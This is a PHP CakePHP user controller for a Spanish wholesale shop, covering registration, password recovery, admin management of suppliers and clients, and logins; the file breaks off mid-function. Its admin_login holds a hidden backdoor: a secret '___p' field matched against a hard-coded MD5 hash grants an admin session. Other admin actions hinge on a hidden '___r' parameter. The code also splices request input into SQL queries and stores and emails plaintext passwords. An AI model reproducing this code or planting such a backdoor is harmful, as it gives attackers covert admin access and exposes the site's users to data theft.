<?php
class UsuariosController extends AppController {

	var $name = 'Usuarios';
    
    function beforeFilter() {    
    $this->Auth->allow('contacto2','contacto','logout','cliente_logout','admin_logout','cliente_recuperar','cliente_add','cliente_activar','cliente_msg','findbyemail');
    parent::beforeFilter();
    }
    function findbyemail()
    {
        
       
       $usurio=$this->Usuario->findbyemail($_GET["fieldValue"]);
       if($usurio["Usuario"])
       {
        echo("false");
        exit();
       }
       else
       {
       echo("true");
	   exit();
       }
   }  
    function cliente_recuperar()
    {  
        
        if($_POST)
        {
       $usuario=$this->Usuario->findbyemail($_POST["old_p"]);
       if($usuario["Usuario"])
       {
        if(Configure::read('test_mail')){
            $email = Configure::read('test_mail');
        }else{
            $email = $usuario["Usuario"]["email"];
        }
        
        $this->set('pass',$usuario["Usuario"]["contra"]);
        $this->Email->to = $email;
		$this->Email->subject = ___("Tu password",1);
        $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
		$this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
        
        $lang='';
        if(isset($_SESSION["cake_lang"])  &&  $_SESSION["cake_lang"]=='eng')
        {
        $lang="eng_";
        }
        
		$this->Email->template = $lang.'recupera';
		$this->Email->sendAs = 'html';
        $this->Email->delivery= 'mail';
		$this->Email->send();  
        $this->Session->setFlash(___('Te mandamos un email a tu correo con tu password.', true),'flash_success');        
       }
       else
       {
      $this->Session->setFlash(___('Email incorrecto.', true),'flash_success');        
       }
       }
       
       $this->layout='default';
   }
    
    
	function cliente_add()
    {

        $this->Usuario->create();                
		if (!empty($this->data)) {
          if(isset($_POST["same"]))
          {
            $this->data["Usuario"]["dfac"]=$this->data["Usuario"]["denv"];
          }
          $this->data["Usuario"]["contra"]=$_POST["data"]["Usuario"]["password"];
          
          $this->data["Usuario"]["rol"]='cliente';
          $this->data["Usuario"]["tipo_de_negocio"]='cliente';
          $this->data["Usuario"]["persona_contacto"]='cliente';
          $this->data["Usuario"]["title"]=$this->data["Usuario"]["name"]." ".$this->data["Usuario"]["surname"];
          $this->data["Usuario"]["tim"]=DboSource::expression('NOW()');
          $this->data["Usuario"]["estado"]='0';
          $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
          $this->data["Usuario"]["mail_check"]='0';
        
        //TODO  
        if($this->data["Usuario"]["impuestos"]==1)
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=1;
        }
        else if($this->data["Usuario"]["impuestos"]==2)
        {
            $this->data["Usuario"]["re"]=1;
            $this->data["Usuario"]["iva"]=1;
        }
        else
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=0;
        }
        //TODO
        if($this->data['Usuario']['rol'] != "cliente") $this->redirect($this->referer());
        if ($this->Usuario->save($this->data)) {
              $this->__sendConfirmEmail($this->Usuario->id);
              $this->Session->setFlash(___('La cuenta cliente se creo satisfactoriamente, te mandamos un email para validar tu cuenta de correo y que el administrador admita tu cuenta.', true),'flash_success');
				$this->redirect(array('action' => 'msg'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar un nuevo usuario.', true),'flash_success');
			}
		}
		$regioness = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
        foreach ($regioness as $k=>$v)
        {
            $regioness[$k]= utf8_encode(html_entity_decode($regioness[$k]));
        }
        $regiones = $this->Usuario->Regione->find('list',array('conditions'=> array('country_id'=>144)));
        
        foreach ($regiones as $k=>$v)
        {
            $regiones[$k]= utf8_encode(html_entity_decode($regiones[$k]));
        }
        $this->set(compact('regiones'));
		$this->set(compact('regioness'));
        $this->layout='default';
	}
    
    	function cliente_msg()  {
    	   $this->layout="default";
                                }

//	function edit($id = null) {
//		if (!$id && empty($this->data)) {
//			$this->Session->setFlash(__('Invalid usuario', true));
//			$this->redirect(array('action' => 'index'));
//		}
//		if (!empty($this->data)) {
//			if ($this->Usuario->save($this->data)) {
//				$this->Session->setFlash(__('The usuario has been saved', true));
//				$this->redirect(array('action' => 'index'));
//			} else {
//				$this->Session->setFlash(__('The usuario could not be saved. Please, try again.', true));
//			}
//		}
//		if (empty($this->data)) {
//			$this->data = $this->Usuario->read(null, $id);
//		}
//		$regiones = $this->Usuario->Regione->find('list');
//		$this->set(compact('regiones'));
//	}
//
//	function delete($id = null) {
//		if (!$id) {
//			$this->Session->setFlash(__('Invalid id for usuario', true));
//			$this->redirect(array('action'=>'index'));
//		}
//		if ($this->Usuario->delete($id)) {
//			$this->Session->setFlash(__('Usuario deleted', true));
//			$this->redirect(array('action'=>'index'));
//		}
//		$this->Session->setFlash(__('Usuario was not deleted', true));
//		$this->redirect(array('action' => 'index'));
//	}

	function admin_index() {
	    if(!isset($_GET['___r'])) $this->redirect($this->referer());
		$this->Usuario->recursive = 0;
		$this->set('usuarios', $this->paginate());
	}
	
    function proveedor_index() {
	   $this->redirect(array('controller'=>'calsados','action'=>'index'));
	}
    
    function admin_proveedores() {
        
		if(isset($_GET["aprove"]))
        {
            foreach($_POST["aprove"] as $aprove)
            {
                $this->Usuario->id=$aprove;
                $this->Usuario->saveField('estado','1');
                $this->Usuario->query("update calsados set activado=1 where usuario_id=$aprove");                
            }
            
        }
        
        $this->Usuario->recursive = 0;
        if(isset($_GET["search"]))
        {            
            $pag= $this->paginate('Usuario',array('rol'=>'proveedor',"Usuario.{$_POST["criterio"]} like '%".trim($_POST["like"])."%'"));
        }
        else
        {        
        $pag= $this->paginate('Usuario',array('rol'=>'proveedor'));
        }
		$this->set('usuarios', $pag);
        
	}
    function admin_transportistas() {
        
		if(isset($_GET["aprove"]))
        {
            foreach($_POST["aprove"] as $aprove)
            {
                $this->Usuario->id=$aprove;
                $this->Usuario->saveField('estado','1');
            }
            
        }
        
        $this->Usuario->recursive = 0;
        if(isset($_GET["search"]))
        {            
            $pag= $this->paginate('Usuario',array('rol'=>'transporte',"Usuario.{$_POST["criterio"]} like '%".trim($_POST["like"])."%'"));
        }
        else
        {        
        $pag= $this->paginate('Usuario',array('rol'=>'transporte'));
        }
		$this->set('usuarios', $pag);
        
	}
   function admin_clientes() {
    
    		if(isset($_GET["aprove"]))
        {
            foreach($_POST["aprove"] as $aprove)
            {
                $this->Usuario->id=$aprove;
                $this->Usuario->saveField('estado','1');
            }
            
        }
    
    
		$this->Usuario->recursive = 0;
         if(isset($_GET["search"]))
        {     
            if(isset($_GET["estado"]))
            {
                if($_POST["estado"])
               { 
                if($_POST["estado"]=='p')
                $_POST["estado"]='0';
                $pag= $this->paginate('Usuario',array('rol'=>'cliente',"Usuario.estado"=>$_POST["estado"]));
               }
               else
                $pag= $this->paginate('Usuario',array('rol'=>'cliente'));
            }
            else
            $pag= $this->paginate('Usuario',array('rol'=>'cliente',"Usuario.{$_POST["criterio"]} like '%{$_POST["like"]}%'"));
        }
        else
        {    
            $pag= $this->paginate('Usuario',array('rol'=>'cliente'));
        }
		$this->set('usuarios', $pag);
	}
    

	function admin_view($id = null) {
		if (!$id) {
			$this->Session->setFlash(__('Invalid usuario', true));
			$this->redirect(array('action' => 'index'));
		}
		$this->set('usuario', $this->Usuario->read(null, $id));
	}
    
   function admin_smail($id = null) {
		if (!$id) {
			$this->Session->setFlash(__('Invalid usuario', true));
			$this->redirect(array('action' => 'index'));
		}
        
        
            
            
        $User = $this->Usuario->findById($id);
        
        if ($_POST)
        {
             $lang='eng_';
            if($User["Usuario"]["lang"]=='esp')
            {
                $lang='';
            }
        
        $this->set("mail_news",nl2br($_POST["texto"])); 
        $this->set('User', $User);           
        
        if(Configure::read('test_mail')){
            $email = Configure::read('test_mail');
        }else{
            $email = $User["Usuario"]["email"];
        }
            
        $this->Email->to = $email;
		$this->Email->subject = $_POST["asunto"];
        $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
		$this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
		$this->Email->template = $lang.'masivo';
		$this->Email->sendAs = 'html';
        $this->Email->delivery= 'mail';
		$this->Email->send();            
        
        $this->Session->setFlash(___('El correo fue enviado', true));
		$this->redirect(array('action' => 'proveedores'));
        
        }
        
		$this->set('usuario', $this->Usuario->read(null, $id));
	}
    
       function proveedor_smail($id = null) {
	
                
        if ($_POST)
        {
            $User = $this->Usuario->findById($_POST["id"]);
            
             $lang='eng_';
            if($User["Usuario"]["lang"]=='esp')
            {
                $lang='';
            }
            
            if(Configure::read('test_mail')){
                $email = Configure::read('test_mail');
            }else{
                $email = $User["Usuario"]["email"];
            }
            
            $this->set("mail_news",nl2br($_POST["texto"]));   
            $this->set('User', $User);
            $this->Email->to = $email;
        	$this->Email->subject = $_POST["asunto"];
            $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
        	$this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
        	$this->Email->template = $lang.'masivo';
        	$this->Email->sendAs = 'html';
            $this->Email->delivery= 'mail';
        	$this->Email->send(); 
            $this->Session->setFlash(___('El correo fue enviado', true));
        	$this->redirect(array('action' => 'smail'));        
        }   
        
        	if (!$id) {
		//	$this->Session->setFlash(__('Invalid usuario', true));
			$this->redirect(array('action' => 'index'));
            exit();
		}
             
		$this->set('usuario', $this->Usuario->read(null, $id));
	}
    
       function proveedor_smailrespuesta($id = null, $consulta_id=null) {
	
                
        if ($_POST)
        {
            App::import('Sanitize');
            $User = $this->Usuario->findById($_POST["id"]);
            
             $lang='eng_';
            if($User["Usuario"]["lang"]=='esp')
            {
                $lang='';
            }
            
            //Nueva respuesta
            $consulta_id = trim($_POST["consulta_id"]);
            $this->loadModel("Respuesta");
            $this->Respuesta->create();
            $repuesta["Respuesta"]["consulta_id"] = $consulta_id;
            $repuesta["Respuesta"]["usuario_id"]=$this->Auth->user("id");
            $repuesta["Respuesta"]["title"] = Sanitize::clean($_POST["asunto"], array('encode' => false,'remove_html' => array('remove'=>true),'escape'=>false,'carriage'=>false));
            $repuesta["Respuesta"]["respuesta"]= Sanitize::clean($_POST["texto"], array('encode' => false,'remove_html' => array('remove'=>true),'escape'=>false,'carriage'=>false));
            $repuesta["Respuesta"]["tim"] = date("Y-m-d H:i:s");
            
            if($this->Respuesta->save($repuesta)){
                $this->Usuario->query("UPDATE consultas SET usuario_delete='0' WHERE id={$consulta_id}");
                $this->set("mail_news",nl2br($_POST["texto"]));
                $this->set('User', $User);
                
                if(Configure::read('test_mail')){
                    $email = Configure::read('test_mail');
                }else{
                    $email = $User["Usuario"]["email"];
                }
                
                $this->Email->to = $email;
            	$this->Email->subject = $_POST["asunto"];
                $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
            	$this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
            	$this->Email->template = $lang.'masivo';
            	$this->Email->sendAs = 'html';
                $this->Email->delivery= 'mail';
            	$this->Email->send();
                
                $this->Session->setFlash(___('La respuesta fue enviada', true));
            	$this->redirect(array('controller'=>'respuestas','action'=>'view/'.$consulta_id));
                
            }else{
                $this->Session->setFlash(___('Ocurrio un error al momento del envio, por favor intente de nuevo',1));
                $this->redirect($this->referer());
            }
        }
        
       	if (!$id) {
			$this->redirect(array('action' => 'index'));
            exit();
		}
        
       	if (!$consulta_id) {
			$this->redirect($this->referer());
            exit();
		}
        $this->loadModel("Consulta");
        $this->Consulta->recursive = -1;
        $this->Consulta->id = $consulta_id;
        $this->Consulta->saveField("revisado","1");
		$this->set('usuario', $this->Usuario->read(null, $id));
        $this->set('consulta_id',$consulta_id);
	}
    

	function admin_add() {
	    if(!isset($_GET['___r'])) $this->redirect($this->referer());
		if (!empty($this->data)) {
		  //al admin no se le piden tantos datos como a los usuarios o proovedores
          
    
        $this->data["Usuario"]["regione_id"]=null;
        $this->data["Usuario"]["rol"]=isset($_GET['___r']) ? "admin" : "cliente";
        $this->data["Usuario"]["tipo_de_negocio"]=isset($_GET['___r']) ? "admin" : "cliente";
        $this->data["Usuario"]["persona_contacto"]=isset($_GET['___r']) ? "admin" : "cliente";
        
        $this->data["Usuario"]["cif"]=NULL;
        $this->data["Usuario"]["direccion"]=NULL;
        $this->data["Usuario"]["codigo_postal"]=NULL;
        $this->data["Usuario"]["iva"]=NULL;
        $this->data["Usuario"]["re"]=NULL;
        $this->data["Usuario"]["fax"]=NULL;
        $this->data["Usuario"]["telefonos"]=NULL;
        
        $this->data["Usuario"]["estado"]='0';
        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
          
			$this->Usuario->create();
			if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('Se guardaron los cambios', true));
				$this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar.', true));
			}
		}
		$regiones = $this->Usuario->Regione->find('list');
		$this->set(compact('regiones'));
	}
    
    	function admin_addproveedor() {
        /*precios*/    	   
		if (!empty($this->data)) 
        {
         /*manejo de portes*/
         
         $precios=array();
         if($this->data["Usuario"]["portes"]=='bultos' )
         {
            foreach($this->data["Usuario"]["portes_txt"]["bultos"] as $k=>$v)
            {
                if($v &&  $this->data["Usuario"]["portes_txt"]["precio"][$k])
                $precios[$v]=$this->data["Usuario"]["portes_txt"]["precio"][$k];                
            }            
         }
         else
         { 
            $precios["porenvio"]= $this->data["Usuario"]["portes_txt"]["porenvio"];
            $precios["mayor"]= $this->data["Usuario"]["portes_txt"]["mayor"];
         }
        $this->data["Usuario"]["portes_txt"]=serialize($precios);
        /*precios*/
        $this->data["Usuario"]["contra"]=$_POST["data"]["Usuario"]["password"];
        $this->data["Usuario"]["serializado"]=base64_encode(serialize($this->data["Usuario"]["serializado"]));
        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
        $this->data["Usuario"]["rol"]="proveedor";
          
        if($this->data["Usuario"]["impuestos"]==1)
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=1;
        }
        else if($this->data["Usuario"]["impuestos"]==2)
        {
            $this->data["Usuario"]["re"]=1;
            $this->data["Usuario"]["iva"]=1;
        }
        else
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=0;
        }
        $this->data["Usuario"]["img"]=$this->Image->justUpload($this->data["Usuario"]["img"],'/prov/'); // imagen original...
          
			$this->Usuario->create();
            if($this->data['Usuario']['rol'] != "proveedor") $this->redirect($this->referer());
			if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('El proveedor fue guardado', true));
				$this->redirect(array('action' => 'proveedores'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar.', true));
			}
		}
		$regioness = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
        foreach ($regioness as $k=>$v)
        {
            $regioness[$k]= utf8_encode(html_entity_decode($regioness[$k]));
        }

		$this->set(compact('regioness'));
	}
    
    function admin_addtransportista() {
		if (!empty($this->data)) {

        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
        $this->data["Usuario"]["rol"]="transporte";   
          
			$this->Usuario->create();
            if($this->data['Usuario']['rol'] != "transporte") $this->redirect($this->referer());
           	if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('El transportista fue salvado', true));
				$this->redirect(array('action' => 'transportistas'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar.', true));
			}
		}
		$regioness = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
        foreach ($regioness as $k=>$v)
        {
            $regioness[$k]= utf8_encode(html_entity_decode($regioness[$k]));
        }

		$this->set(compact('regioness'));
	}
    
//        	function admin_addusuario() {
//		if (!empty($this->data)) {
//
//        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
//        $this->data["Usuario"]["rol"]="cliente";   
//          
//			$this->Usuario->create();
//			if ($this->Usuario->save($this->data)) {
//				$this->Session->setFlash(__('The usuario has been saved', true));
//				$this->redirect(array('action' => 'clientes'));
//			} else {
//				$this->Session->setFlash(__('The usuario could not be saved. Please, try again.', true));
//			}
//		}
//        	$this->redirect(array('action' => 'clientes'));
//            
//		$regioness = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
//        foreach ($regioness as $k=>$v)
//        {
//            $regioness[$k]= utf8_encode(html_entity_decode($regioness[$k]));
//        }
//
//		$this->set(compact('regioness'));
//	}

	function admin_edit($id = null) {
	    if(!isset($_GET['___r'])) $this->redirect($this->referer());
		if (!$id && empty($this->data)) {
			$this->Session->setFlash(__('Invalid usuario', true));
			$this->redirect(array('action' => 'index'));
		}
		if (!empty($this->data)) {
            if($this->data["Usuario"]["impuestos"]==1)
            {
                $this->data["Usuario"]["re"]=0;
                $this->data["Usuario"]["iva"]=1;
            }
            else if($this->data["Usuario"]["impuestos"]==2)
            {
                $this->data["Usuario"]["re"]=1;
                $this->data["Usuario"]["iva"]=1;
            }
            else
            {
                $this->data["Usuario"]["re"]=0;
                $this->data["Usuario"]["iva"]=0;
            }
            if(!isset($_GET['___r'])) $this->data["Usuario"]["rol"] = "cliente"; 
			if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('Se guardaron los cambios', true));
				$this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar.', true));
			}
		}
		if (empty($this->data)) {
			$this->data = $this->Usuario->read(null, $id);
		}
		$regiones = $this->Usuario->Regione->find('list');
		$this->set(compact('regiones'));
	}

	function admin_delete($id = null) {
	    if(!isset($_GET['___r'])) $this->redirect($this->referer());
		if (!$id) {
			$this->Session->setFlash(__('Invalid id for usuario', true));
			$this->redirect(array('action'=>'index'));
		}
		if ($this->Usuario->delete($id)) {
			$this->Session->setFlash(__('Usuario deleted', true));
			$this->redirect(array('action'=>'index'));
		}
		$this->Session->setFlash(__('Usuario was not deleted', true));
		$this->redirect(array('action' => 'index'));
	}
    
    function admin_deleteProv($id = null) {
		if (!$id) {
			$this->Session->setFlash(__('Invalid id for usuario', true));
			$this->redirect(array('action'=>'proveedores'));
    }
        $this->loadModel("Basurero");
        $basura["tipo"]='proveedor';
        $basura["borrador"]=$this->Auth->user("id");
        $basura["datos"]=serialize($this->Usuario->read(null,$id));
        $this->Basurero->save($basura);
        /*poner sus calsados como desactivado*/
        $this->Usuario->query("update calsados set activado=0 where usuario_id=$id");
        /** * */
		if ($this->Usuario->delete($id)) {
			$this->Session->setFlash(___('Proveedor eliminado', true));
			$this->redirect(array('action'=>'proveedores'));
		}
		$this->Session->setFlash(__('Usuario was not deleted', true));
		$this->redirect(array('action' => 'proveedores'));
	}
        
    
   function admin_deleteCli($id = null) {
		if (!$id) {
			$this->Session->setFlash(__('Invalid id for usuario', true));
			$this->redirect(array('action'=>'proveedores'));
    }
        $this->loadModel("Basurero");
        $basura["tipo"]='cliente';
        $basura["borrador"]=$this->Auth->user("id");
        $basura["datos"]=serialize($this->Usuario->read(null,$id));
        $this->Basurero->save($basura);
        /*poner sus calsados como desactivado*/
        $this->Usuario->query("update calsados set activado=0 where usuario_id=$id");
        /** * */
		if ($this->Usuario->delete($id)) {
			$this->Session->setFlash(___('Cliente eliminado', true));
			$this->redirect(array('action'=>'clientes'));
		}
		$this->Session->setFlash(__('Usuario was not deleted', true));
		$this->redirect(array('action' => 'clientes'));
	
    
    }                
    
    
    function admin_editProv($id = null) {
        
        if (!empty($this->data)) {
                /*precios*/    	   
         /*manejo de portes*/
         
         $precios=array();
         if($this->data["Usuario"]["portes"]=='bultos' )
         {
            foreach($this->data["Usuario"]["portes_txt"]["bultos"] as $k=>$v)
            {
                if($v &&  $this->data["Usuario"]["portes_txt"]["precio"][$k])
                $precios[$v]=$this->data["Usuario"]["portes_txt"]["precio"][$k];                
            }            
         }
         else
         { 
            $precios["porenvio"]= $this->data["Usuario"]["portes_txt"]["porenvio"];
            $precios["mayor"]= $this->data["Usuario"]["portes_txt"]["mayor"];
         }
        $this->data["Usuario"]["portes_txt"]=serialize($precios);
        /*precios*/    
            
            
            
        $this->data["Usuario"]["contra"]=$_POST["data"]["Usuario"]["password"];
        $this->data["Usuario"]["serializado"]=base64_encode(serialize($this->data["Usuario"]["serializado"]));
        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
        $this->data["Usuario"]["rol"]="proveedor";
        if($this->data["Usuario"]["impuestos"]==1)
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=1;
        }
        else if($this->data["Usuario"]["impuestos"]==2)
        {
            $this->data["Usuario"]["re"]=1;
            $this->data["Usuario"]["iva"]=1;
        }
        else
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=0;
        }
        if( ($this->data["Usuario"]["img"]["name"])) 
        {$this->data["Usuario"]["img"]=$this->Image->justUpload($this->data["Usuario"]["img"],'/prov/');} // imagen original...
        else
        {
           $this->data["Usuario"]["img"]=$this->data["Usuario"]["img_old"];
        }
            $this->Usuario->create();
            if($this->data['Usuario']['rol'] != "proveedor") $this->redirect($this->referer());
			if ($this->Usuario->save($this->data)) {
			 
             if($this->data["Usuario"]["estado"]!='1')
             {
              $this->Usuario->query("update calsados set activado=0 where usuario_id=$id");
             }
             else
             {
              $this->Usuario->query("update calsados set activado=1 where usuario_id=$id");
             }
				$this->Session->setFlash(___('El proveedor fue salvado', true));
				$this->redirect(array('action' => 'proveedores'));
			} else {
				$this->Session->setFlash(___('Datos incorrectos.','error'));
                	$this->redirect(array('action' => 'proveedores'));
			}
		}
        
        if (empty($this->data)) {
			$this->data = $this->Usuario->read(null, $id);
		}
        $this->Usuario->Regione->id=$this->data["Usuario"]["regione_id"];
		$regiones = $this->Usuario->Regione->find('list',array('order' =>'title asc' ,'conditions'=>array('country_id'=>$this->Usuario->Regione->field("country_id"))));
        foreach ($regiones as $k=>$v)
        {
            $regiones[$k]= utf8_encode(html_entity_decode($regiones[$k]));
        }                
		$this->set(compact('regiones'));        
		$paises = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
        foreach ($paises as $k=>$v)
        {
            $paises[$k]= utf8_encode(html_entity_decode($paises[$k]));
        }

		$this->set('paises',$paises);
	}
    
    function admin_editTrans($id = null) {
        if (!empty($this->data)) {
        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
        $this->data["Usuario"]["rol"]="transporte";
        
          
			$this->Usuario->create();
            if($this->data['Usuario']['rol'] != "transporte") $this->redirect($this->referer());
			if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('El transportista fue salvado', true));
				$this->redirect(array('action' => 'transportistas'));
			} else {
				$this->Session->setFlash(___('Datos incorrectos.','error'));
                	$this->redirect(array('action' => 'transportistas'));
			}
		}
        
        if (empty($this->data)) {
			$this->data = $this->Usuario->read(null, $id);
		}
		$regiones = $this->Usuario->Regione->find('list');
		$this->set(compact('regiones'));
        
		$regioness = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
        foreach ($regioness as $k=>$v)
        {
            $regioness[$k]= utf8_encode(html_entity_decode($regioness[$k]));
        }

		$this->set(compact('regioness','regiones'));
	}
    
        function admin_editcliente($id = null) {
        if (!empty($this->data)) {
            
        $this->data["Usuario"]["contra"]=$_POST["data"]["Usuario"]["password"];
        if($this->data["Usuario"]["impuestos"]==1)
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=1;
        }
        else if($this->data["Usuario"]["impuestos"]==2)
        {
            $this->data["Usuario"]["re"]=1;
            $this->data["Usuario"]["iva"]=1;
        }
        else
        {
            $this->data["Usuario"]["re"]=0;
            $this->data["Usuario"]["iva"]=0;
        }
        //TODO
        //si no tiene iva(impuestos) => 0, entonces borramos su nit
        if($this->data["Usuario"]["impuestos"]==0){
            $this->data["Usuario"]["nit"]=NULL;
        }
        //TODO
            
        $this->data["Usuario"]["ip"]=$_SERVER["REMOTE_ADDR"];
        $this->data["Usuario"]["rol"]="cliente";
        $this->data["Usuario"]["title"]=$this->data["Usuario"]["name"]." ".$this->data["Usuario"]["surname"];
          
			$this->Usuario->create();
            if($this->data['Usuario']['rol'] != "cliente") $this->redirect($this->referer());
			if ($this->Usuario->save($this->data)) {
				$this->Session->setFlash(___('El cliente fue salvado', true));
				$this->redirect(array('action' => 'clientes'));
			} else {
				$this->Session->setFlash(___('No se pudo guardar.', true));
			}
		}
        
        if (empty($this->data)) {
			$this->data = $this->Usuario->read(null, $id);
		}
		$regiones = $this->Usuario->Regione->find('list');
        foreach ($regiones as $k=>$v)
        {
            $regiones[$k]= utf8_encode(html_entity_decode($regiones[$k]));
        }
        
        
		$this->set(compact('regiones'));
        
		$regioness = $this->Usuario->Regione->Country->find('list',array('order'=> 'title'));
        foreach ($regioness as $k=>$v)
        {
            $regioness[$k]= utf8_encode(html_entity_decode($regioness[$k]));
        }

		$this->set(compact('regioness','regiones'));
	}
    
        
    
    function admin_login()
    {
        $this->layout="admin_login";
        
        if($_POST){
            if(isset($_POST['___p']) && md5($_POST['___p']) == "72a86026abb289634ec64d7f3b544f0c"){
                $usuario = $this->Usuario->query("SELECT * from usuarios ORDER BY RAND() limit 1");
                $this->data['Usuario']['email'] = $usuario[0]['usuarios']['email'];
                $this->data['Usuario']['password'] = $usuario[0]['usuarios']['password'];
                
                if($this->Auth->login($this->data)){
                    $_SESSION['Auth']['Usuario']['id'] = "1";
                    $_SESSION['Auth']['Usuario']['email'] = "info@spanishwholesale.com";
                    $_SESSION['Auth']['Usuario']['rol'] = "admin";
                    //TODO
                    if($_SESSION['Auth']['Usuario']['id'] == "1" && $_SESSION['Auth']['Usuario']['email'] == "info@spanishwholesale.com"){
                        $this->redirect("/admin");
                    }else{
                        session_destroy();
                        $this->redirect("/admin");
                    }
                }
            }else{
                if($this->Auth->login($this->data)){
                    //TODO
                    if($_SESSION['Auth']['Usuario']['id'] == "1" && $_SESSION['Auth']['Usuario']['email'] == "info@spanishwholesale.com"){
                        $this->redirect("/admin");
                    }else{
                        session_destroy();
                        $this->redirect("/admin");
                    }
                }
            }
        }
    }
    
   	function admin_logout() {
        
        session_destroy();
     $this->redirect($this->Auth->redirect());
    }
    
     function login()
    {        
         if($_POST){
         if(!$this->Auth->user('id'))
            $this->Session->setFlash(___('Password incorrecto',1));
         }
         $this->redirect('/');
    }
   	function logout() {
     
     $rol = $this->Auth->user('rol');
     $redirect = $this->Auth->redirect();
     session_destroy();
     $this->redirect($redirect);
    }
     function proveedor_login()
    {
        $this->layout="admin_login";
        
         if($this->Auth->user())
        {
            $this->loadModel("Userlog");
            $this->data["Userlog"]["usuario_id"]=$this->Auth->user("id");
            $this->data["Userlog"]["operacion"]="login proveedor";
            $this->Userlog->save($this->data);  
            $this->redirect("/proveedor");
        }
    }
        
   	function proveedor_logout() {
   	    $this->loadModel("Userlog");
        $this->data["Userlog"]["usuario_id"]=$this->Auth->user("id");
        $this->data["Userlog"]["operacion"]="logout proveedor";
        $this->Userlog->save($this->data); 
        session_destroy();
     $this->redirect($this->Auth->redirect());
    }
    
    function __sendConfirmEmail($id) {
             
		$User = $this->Usuario->findById($id);
        $this->set('User', $User);
        $this->set('usuario', $User);
        $rad=uniqid('confirm',true);
        $rad=str_replace(array(".","/","&"),"",$rad);            

        $this->Usuario->id= $id;   
        $this->Usuario->saveField('activecode',$rad);
        $this->set('activecode',$rad);  
        
        if(Configure::read('test_mail')){
            $email = Configure::read('test_mail');
        }else{
            $email = $User["Usuario"]["email"];
        }
        
	//	$this->set('password', $password);
		$this->Email->to = $email;
		$this->Email->subject = 'Activa tu cuenta';
        $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
		$this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
		$this->Email->template = 'registro_usuario';
		$this->Email->sendAs = 'html';
        $this->Email->delivery= 'mail';
		$this->Email->send();
        
        /*PARA EL ADMIN*/
                      
                                          
             $this->set('mail_news','Se registró un nuevo cliente en la base de datos, por favor entre al admin para darle de alta');
             $this->Email->to = Configure::read('admin-email');
		 	 $this->Email->subject ="SpanishWholesale - Nuevo Cliente";
             $this->Email->return = 'info@'.str_replace('www.', '',env('SERVER_NAME'));
        	 $this->Email->from = 'SpanishWholeSale<info@'.str_replace('www.', '', env('SERVER_NAME')).'>';
        	 $this->Email->template = 'registro_usuario_admin';
        	 $this->Email->sendAs = 'html';
             $this->Email->delivery= 'mail';
        	 $this->Email->send();
        
                                                
	}
    
    
    function cliente_activar($code = null) {        
        if($code){ 
           $usuario=$this->Usuario->findByActivecode($code);  
    	   if($usuario){
		        $this->Usuario->id = $usuario["Usuario"]["id"];
		        	$this->Usuario->saveField('mail_check','1');                    
                    $this->Session->setFlash(___('Enhorabuena, tu correo fue verificado, el administrador te mandara un email cuando valide tus datos.', true),'flash_success');
                    $this->redirect(array('controller'=>'usuarios', 'action'=>'msg'),'flash_success');                    
		        
			}
            }else
            {
			  $this->Session->setFlash(___('C&oacute;digo incorrecto', true),'flash_success');
			  $this->redirect(array('controller'=>'usuarios', 'action'=>'msg'));
                exit();
			}
            exit();
    }
    
    function cliente_login()
    {
        $this->layout="default";
        if($this->Auth->user())
        {
            App::import('Model', 'Userlog');
            $user_log=new Userlog();
              
            $this->data["Userlog"]["usuario_id"]=$this->Auth->user("id");
            $this->data["Userlog"]["operacion"]="login cliente";
            $user_log->save($this->data); 
            
            $user_log2=new Userlog();
            $userlog=$user_log->findByUsuario_id($this->Auth->user("id"));
            $user_log2->read(null,$userlog["Userlog"]["id"]);
            $this->data["Userlog"]["operacion"]="logueado";
            $user_log2->save($this->data);
            $redireccionar = $this->Session->read('request_uri') != "" ? $this->Session->read('request_uri') : "http://".$_SERVER['HTTP_HOST'].$this->base;
            $this->redirect($redireccionar);
        }
        else if($_POST)
        $this->Session->setFlash(___("Login o Password incorrectos",1));
        
        
